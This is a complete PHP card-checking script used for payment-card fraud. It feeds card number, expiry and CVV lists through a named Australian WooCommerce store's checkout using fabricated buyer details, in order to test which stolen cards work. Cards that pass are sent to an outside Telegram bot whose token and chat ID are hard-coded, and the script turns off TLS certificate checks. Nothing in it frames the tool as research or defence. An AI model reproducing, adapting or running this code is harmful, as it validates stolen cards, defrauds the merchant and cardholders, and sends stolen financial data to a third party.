<?php

set_time_limit(0);
error_reporting(0);
date_default_timezone_set('Asia/Manila');

function telegram($msg) {
        global $telegrambot,$telegramchatid;
        $url='https://api.telegram.org/bot'.$telegrambot.'/sendMessage';$data=array('chat_id'=>$telegramchatid,'text'=>$msg);
        $options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
        $context=stream_context_create($options);
        $result=file_get_contents($url,false,$context);
        return $result;
}

// Set your Bot ID and Chat ID.
$telegrambot = '1310517387:AAFmBVli3NGTd5dKPZRiVPMiEQkmUwYWGHY';
$telegramchatid = '-456938312';
//1310517387:AAFmBVli3NGTd5dKPZRiVPMiEQkmUwYWGHY

function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$ano2 = substr($ano,2);
$cvv = $separar[3];
$email = "johnhans".rand(111111,999999).''.array('@gmail.com','@hotmail.com','@outlook.com','@hotmail.co.uk')[rand(0,3)].'';
$postal = "3".rand(111, 999)."2";
$aupostal = "4".rand(1, 9)."6";
$devicerand = rand(100, 900);
$ukpostal = chr(rand(65,90)).chr(rand(65,90)).rand(0,9)."+".rand(0,9).chr(rand(65,90)).chr(rand(65,90));
$canadapostal = chr(rand(65,90)).rand(0,9).chr(rand(65,90))."+".rand(0,9).chr(rand(65,90)).rand(0,9);


 if(strlen($ano) > 2)
 {
   $ano1 = substr($ano,2,2);
 }
 if(substr($mes,0,1) == 0)
 {
   $mes1 = substr($mes,1,1);
 }else {
     $mes1 = $mes;
 }

$cbin = substr($cc, 0,1);
if($cbin == "5"){
$cbin = "MC";
}else if($cbin == "4"){
$cbin = "VISA";
}else if($cbin == "3"){
$cbin = "AMEX";
}
 $bin = substr($cc,0,6);
 $first4 = substr($cc,0,4);
 $second4 = substr($cc, 4,4);
 $third4 = substr($cc, 8, 4);
 $last4 = substr($cc,12,4);
 $last2 = substr($cc, 14,2);

if (file_exists('shoppay.txt')){
unlink('shoppay.txt');
}

function getContents($str, $startDelimiter, $endDelimiter) {
  $contents = array();
  $startDelimiterLength = strlen($startDelimiter);
  $endDelimiterLength = strlen($endDelimiter);
  $startFrom = $contentStart = $contentEnd = 0;
  while (false !== ($contentStart = strpos($str, $startDelimiter, $startFrom))) {
    $contentStart += $startDelimiterLength;
    $contentEnd = strpos($str, $endDelimiter, $contentStart);
    if (false === $contentEnd) {
      break;
    }
    $contents[] = substr($str, $contentStart, $contentEnd - $contentStart);
    $startFrom = $contentEnd + $endDelimiterLength;
  }

  return $contents;
}


///////////==<(RANDOM USER)))=//////=====
$list = file_get_contents("https://namegenerator.in/assets/refresh.php?location=united%20states");
$list2 = json_decode($list, true);
$name1 = $list2['name'];
$name = explode(" ", $name1)[0];
$last = explode(" ", $name1)[1];
$street = $list2['street1'];
$city1 = $list2['street2'];
$city = explode(",", $city1)[0];
$state = explode(" ", $city1)[1];
$zip = explode(" ", $city1)[2];
$pass = $name.rand(11111,99999);
$phone = rand(11111111111,88888888888);



$ch = curl_init();
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/shoppay.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/shoppay.txt');
curl_setopt($ch, CURLOPT_URL, 'https://www.traps.com.au/product/chain-rig-parts/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'attribute_pa_spare-parts=mb-crunch-prf-swivel-j-hooks&quantity=1&add-to-cart=3949&product_id=3949&variation_id=3953');
$headers = array();
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Origin: https://www.traps.com.au';
$headers[] = 'Referer: https://www.traps.com.au/product/chain-rig-parts/?attribute_pa_spare-parts=mb-crunch-prf-swivel-j-hooks';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$shoppay1 = curl_exec($ch);
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/shoppay.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/shoppay.txt');
curl_setopt($ch, CURLOPT_URL, 'https://www.traps.com.au/cart/checkout/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$shoppay2 = curl_exec($ch);
$nonce = GetStr($shoppay2, '<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="','" />');
curl_close($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/shoppay.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/shoppay.txt');
curl_setopt($ch, CURLOPT_URL, 'https://www.traps.com.au/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=John&billing_last_name=Hans&billing_company=&billing_country=AU&billing_address_1='.rand(11,99).'+Expansion+Street&billing_address_2=&billing_city=Molendinar&billing_state=QLD&billing_postcode=4214&billing_phone=55'.rand(111111,999999).'&billing_email='.$email.'&shipping_first_name=John&shipping_last_name=Hans&shipping_company=&shipping_country=AU&shipping_address_1='.rand(11,99).'+Expansion+Street&shipping_address_2=&shipping_city=Molendinar&shipping_state=QLD&shipping_postcode=4214&order_comments=&shipping_method%5B0%5D=ozpost.PPSE5&payment_method=mpgs&mpgs_card_type='.$cbin.'&mpgs_card_holder=John+Hans&mpgs_card_number='.$cc.'&mpgs_card_expiration_month='.$mes.'&mpgs_card_expiration_year='.$ano1.'&mpgs_card_csc='.$cvv.'&terms=on&terms-field=1&woocommerce-process-checkout-nonce='.$nonce.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
$headers = array();
$headers[] = 'Host: www.traps.com.au';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Origin: https://www.traps.com.au';
$headers[] = 'Referer: https://www.traps.com.au/cart/checkout/';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$shoppay3 = curl_exec($ch);
$err = GetStr($shoppay3, '"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\t<pre><strong><\/strong>\n','<\/pre>\t\t<\/li>\n\t<\/ul>\n"');


if(strpos($shoppay3, '"result":"success"') )
{
telegram ("LIVE | $lista | success ");  
echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada<i class='zmdi zmdi-check'></i></font> $lista <font size=2 color='white'><font class='badge badge-success'>L I V E</i> </font><br>";  
}
else if(strpos($shoppay3, "sufficient") !== false) 
{
telegram ("LIVE | $lista | Insufficient ");
echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada<i class='zmdi zmdi-check'></i></font> $lista <font size=2 color='white'><font class='badge badge-success'>$err</i> </font><br>"; 
}
else if(strpos($shoppay3, "Card security code is invalid") !== false) 
{
echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada<i class='zmdi zmdi-close'></i></font> $lista <font size=2 color='white'><font class='badge badge-danger'>Card security code is invalid</i> </font><br>";
}
else if(strpos($shoppay3, "Card expiration date is invalid") !== false) 
{
echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada<i class='zmdi zmdi-close'></i></font> $lista <font size=2 color='white'><font class='badge badge-danger'>Card expiration date is invalid</i> </font><br>";
}
else if(strpos($shoppay3, "Sorry, your session has expired") !== false) 
{
echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada<i class='zmdi zmdi-close'></i></font> $lista <font size=2 color='white'><font class='badge badge-danger'>session has expired</i> </font><br>";
}
else if(strpos($shoppay3, "Continue shopping") !== false) 
{
echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada<i class='zmdi zmdi-close'></i></font> $lista <font size=2 color='white'><font class='badge badge-danger'>added to cart</i> </font><br>";
}
else if(strpos($shoppay3, "We were unable to process") !== false) 
{
echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada<i class='zmdi zmdi-close'></i></font> $lista <font size=2 color='white'><font class='badge badge-danger'>We were unable to process</i> </font><br>";
}
else if(strpos($shoppay3, "502 Bad Gateway") !== false) 
{
echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada<i class='zmdi zmdi-close'></i></font> $lista <font size=2 color='white'><font class='badge badge-danger'>502 Bad Gateway</i> </font><br>";
}
else if(strpos($shoppay3, "503 Service Temporarily Unavailable") !== false) 
{
echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada<i class='zmdi zmdi-close'></i></font> $lista <font size=2 color='white'><font class='badge badge-danger'>503 Service Temporarily Unavailable</i> </font><br>";
}
else if(strpos($shoppay3, "504 Gateway Time-out") !== false) 
{
echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada<i class='zmdi zmdi-close'></i></font> $lista <font size=2 color='white'><font class='badge badge-danger'>504 Gateway Time-out</i> </font><br>";
}
else if(strpos($shoppay3, "524 Origin Time-out") !== false) 
{
echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada<i class='zmdi zmdi-close'></i></font> $lista <font size=2 color='white'><font class='badge badge-danger'>524 Origin Time-out</i> </font><br>";
}
else if(empty($err)) 
{
echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada<i class='zmdi zmdi-close'></i></font> $lista $shoppay3 </font><br>";
}
else
{
echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada<i class='zmdi zmdi-close'></i></font> $lista <font class='badge badge-danger'>$err</i> </font><br>";
}


curl_close($ch);
unlink('shoppay.txt');
ob_flush();
?>